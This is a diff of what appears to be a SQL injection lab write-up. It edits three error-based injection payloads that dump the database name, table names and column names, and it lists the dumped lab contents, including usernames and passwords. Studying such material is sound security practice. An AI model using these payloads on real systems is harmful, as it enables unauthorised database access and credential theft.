@@ -68,14 +68,19 @@ we can use ``rand(),floor(),count()`` to get error
 
 ## ***payloads to dump***
 
-This will get database ```/?id=1' AND (select 1 from(select count(*),concat((select database()),floor(rand()*2))a from information_schema.tables group by a)b)--+```
-to get table names ```/?id=1' AND (select 1 from(select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1),floor(rand()*2))a from information_schema.tables group by a)b)--+```
-to get columns ```/?id=1' AND (select 1 from(select count(*),concat((select column_name from information_schema.columns where table_name='emails' limit 0,1),floor(rand()*2))a from information_schema.tables group by a)b)--+```
+This will get database ```/?id=1' AND (select 1 from(select count(*),concat((select database()),floor(rand()*2))a from information_schema.tables group by a)b)-- -```
+
+to get table names ```/?id=1' AND (select 1 from(select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1),floor(rand()*2))a from information_schema.tables group by a)b)-- -```
+
+to get columns ```/?id=1' AND (select 1 from(select count(*),concat((select column_name from information_schema.columns where table_name='emails' limit 0,1),floor(rand()*2))a from information_schema.tables group by a)b)-- -```
 
 # ***contents of database***
 
 1.databasename = security
+
 2.tables = emails,referers,uagents,users
+
 3.columns = CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,USER,id,password,username
+
 4.usernames = Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4
 password = Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4
